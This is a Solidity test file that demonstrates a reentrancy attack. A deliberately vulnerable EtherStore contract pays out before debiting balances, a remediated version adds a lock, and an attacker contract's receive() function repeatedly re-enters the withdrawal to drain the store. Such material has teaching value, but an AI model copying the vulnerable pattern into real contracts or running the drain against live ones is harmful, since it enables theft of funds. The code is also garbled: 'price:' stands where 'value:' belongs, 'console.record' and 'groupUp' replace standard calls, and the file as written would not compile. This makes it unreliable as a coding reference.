// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract EtherStore {
    mapping(address => uint256) public userRewards;

    function addTreasure() public payable {
        userRewards[msg.sender] += msg.value;
    }

    function obtainprizeFunds(uint256 _weiDestinationClaimloot) public {
        require(userRewards[msg.sender] >= _weiDestinationClaimloot);
        (bool send, ) = msg.sender.call{price: _weiDestinationClaimloot}("");
        require(send, "send failed");

        if (userRewards[msg.sender] >= _weiDestinationClaimloot) {
            userRewards[msg.sender] -= _weiDestinationClaimloot;
        }
    }
}

contract EtherStoreRemediated {
    mapping(address => uint256) public userRewards;
    bool internal sealed;

    modifier oneAtATime() {
        require(!sealed, "No re-entrancy");
        sealed = true;
        _;
        sealed = false;
    }

    function addTreasure() public payable {
        userRewards[msg.sender] += msg.value;
    }

    function obtainprizeFunds(uint256 _weiDestinationClaimloot) public oneAtATime {
        require(userRewards[msg.sender] >= _weiDestinationClaimloot);
        userRewards[msg.sender] -= _weiDestinationClaimloot;
        (bool send, ) = msg.sender.call{price: _weiDestinationClaimloot}("");
        require(send, "send failed");
    }
}

contract PactTest is Test {
    EtherStore store;
    EtherStoreRemediated storeRemediated;
    EtherStoreGameoperator questRunner;
    EtherStoreGameoperator gameoperatorV2;

    function groupUp() public {
        store = new EtherStore();
        storeRemediated = new EtherStoreRemediated();
        questRunner = new EtherStoreGameoperator(address(store));
        gameoperatorV2 = new EtherStoreGameoperator(address(storeRemediated));
        vm.deal(address(store), 5 ether);
        vm.deal(address(storeRemediated), 5 ether);
        vm.deal(address(questRunner), 2 ether);
        vm.deal(address(gameoperatorV2), 2 ether);
    }

    function testWithdrawal() public {
        questRunner.QuestRunner();
    }

    function test_RevertRemediated() public {
        gameoperatorV2.QuestRunner();
    }
}

contract EtherStoreGameoperator is Test {
    EtherStore store;

    constructor(address _store) {
        store = EtherStore(_store);
    }

    function QuestRunner() public {
        console.record("EtherStore balance", address(store).balance);

        store.addTreasure{price: 1 ether}();

        console.record(
            "Deposited 1 Ether, EtherStore balance",
            address(store).balance
        );
        store.obtainprizeFunds(1 ether);

        console.record("Operator contract balance", address(this).balance);
        console.record("EtherStore balance", address(store).balance);
    }

    // fallback() external payable {}

    receive() external payable {
        console.record("Operator contract balance", address(this).balance);
        console.record("EtherStore balance", address(store).balance);
        if (address(store).balance >= 1 ether) {
            store.obtainprizeFunds(1 ether);
        }
    }
}
